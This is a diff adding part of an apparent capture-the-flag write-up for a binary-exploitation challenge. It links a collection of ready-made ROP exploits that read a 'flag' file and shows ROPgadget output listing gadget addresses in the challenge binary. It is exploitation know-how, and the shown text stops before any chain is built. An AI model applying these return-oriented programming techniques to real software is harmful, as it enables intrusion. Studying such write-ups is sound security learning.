@@ -91,3 +91,32 @@ void main() {
 }
 ```
 {: file=main.c}
+
+
+When googling, one can find pretty much [pre-composed ROP exploits to read a file named 'flag'](https://gist.github.com/rverton/42340ee4bd3482c6262db2bc9bbb9ef5) (32 bit), we just need to know how to adapt it to our situation. Additionally this article is quite instructive (and leads to python at the end)
+
+
+
+We can then combine this, hopefully with `ROPgadget` to find apporpriate gadgets:
+
+
+```
+user@p-ctf:~/Downloads/thumperspwn2$ ropgadget --binary main --only "pop|ret"
+Gadgets information
+============================================================
+0x00000000004007fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004007fe : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400800 : pop r14 ; pop r15 ; ret
+0x0000000000400802 : pop r15 ; ret
+0x00000000004007fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004007ff : pop rbp ; pop r14 ; pop r15 ; ret
+0x0000000000400608 : pop rbp ; ret
+0x0000000000400803 : pop rdi ; ret
+0x0000000000400801 : pop rsi ; pop r15 ; ret
+0x00000000004007fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400536 : ret
+0x0000000000400542 : ret 0x200a
+0x00000000004006f2 : ret 0x2be
+
+Unique gadgets found: 13
+```
